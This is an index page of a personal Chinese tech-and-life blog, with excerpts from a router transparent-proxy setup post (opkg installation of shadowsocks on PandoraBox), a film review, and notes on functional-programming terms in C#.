<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh root@192.168.33.1</span><br><span class="line">opkg update</span><br><span class="line">opkg install shadowsocks-libev luci-app-shadowsocks ChinaDNS luci-app-chinadns --force-checksum</span><br></pre></td></tr></table></figure>

<p>这个版本的软件源有点问题，所以直接<code>opkg install</code>基本上都过不了<code>sha256sum</code>检测，所以需要加上<code>--force-checksum</code>参数强制忽略。两个luci界面都有zh-cn汉化包，为了节省路由器空间，就不装了。</p>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2017/02/07/Pandorabox-transparent-proxy/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2017/02/04/%E6%84%BF%E6%B5%AE%E8%90%8D%E4%B9%98%E9%A3%8E%E7%A0%B4%E6%B5%AA/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/02/04/%E6%84%BF%E6%B5%AE%E8%90%8D%E4%B9%98%E9%A3%8E%E7%A0%B4%E6%B5%AA/" itemprop="url">愿浮萍乘风破浪</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-02-04T22:31:33+08:00">
                2017-02-04
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E7%94%9F%E6%B4%BB%E6%84%9F%E6%82%9F/" itemprop="url" rel="index">
                    <span itemprop="name">生活感悟</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          虽然前期在微博上经常看到韩寒在为这部电影做宣传，但我一直想知道它会一种什么样的方式来讲述这个故事，我隐隐约约觉得徐太浪(邓超饰)、徐正太(彭于晏饰)、小花(赵丽颖饰)三个人之间的关系非同寻常，我甚至臆想这是一部俗套的三角恋的故事;顶风作案的罗力，承诺要给松子一方天地，然而等他从狱中出来，见到的却是坐在黄志强车上神色复杂的那个人，你说这个世界是会变的，可它会变成什么样我们永远无从得知，小马希望的是那个拨号上网频频掉线的时代诞生一款 OICQ 的软件，徐正太希望的是像杜月笙那样收“物业费”......我们期望着什么，我们等待着什么，其实都不重要，世界一直都在变化，而我们如浮萍，或随风漂泊，或乘风破浪，一切都在我们的选择;整个故事其实是一个解惑的过程，所有的线索都是为了让徐太浪明白，自己的父亲为什么会变成这个样子，而围绕这些线索，整理的冲突发生在以徐正太、六一、阿浪、小马为代表的“正太帮”和黄志强、罗力为代表的“黑社会”，双方的利益冲突交织在一间歌舞厅
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2017/02/04/%E6%84%BF%E6%B5%AE%E8%90%8D%E4%B9%98%E9%A3%8E%E7%A0%B4%E6%B5%AA/">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2017/02/02/%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B%E5%B8%B8%E7%94%A8%E6%9C%AF%E8%AF%AD/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/02/02/%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B%E5%B8%B8%E7%94%A8%E6%9C%AF%E8%AF%AD/" itemprop="url">函数式编程常用术语</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-02-02T19:21:12+08:00">
                2017-02-02
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index">
                    <span itemprop="name">读书笔记</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          本文对函数式编程中的常见术语如高阶函数、局部套用/柯里化、惰性求值等结合 C#语言进行了简单分析;举一个基本的例子，.NET 中 IEnumerable<T>接口提供了大量的如 Select、Where 等扩展方法，而这些扩展方法同样会返回 IEnumerable<T>类型，并且这些扩展方法不会改变原来的集合，所有的修改都是作用在一个新的集合上，这就是函数式编程的不可变性;常用的函数式编程术语有高阶函数、柯里化/局部调用、惰性求值，递归等
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2017/02/02/%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B%E5%B8%B8%E7%94%A8%E6%9C%AF%E8%AF%AD/">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/40/">&lt;i class&#x3D;&quot;fa fa-angle-left&quot;&gt;&lt;&#x2F;i&gt;</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/40/">40</a><span class="page-number current">41</span><a class="page-number" href="/page/42/">42</a><span class="space">&hellip;</span><a class="page-number" href="/page/79/">79</a><a class="extend next" rel="next" href="/page/42/">&lt;i class&#x3D;&quot;fa fa-angle-right&quot;&gt;&lt;&#x2F;i&gt;</a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name"></p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/%7C%7C%20archive">
              
                  <span class="site-state-item-count">1579</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                
                  <span class="site-state-item-count">64</span>
                  <span class="site-state-item-name">categories</span>
                
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                
                  <span class="site-state-item-count">914</span>
                  <span class="site-state-item-name">tags</span>
                
              </div>
            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Laird Lau</span>

  
</div>


  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
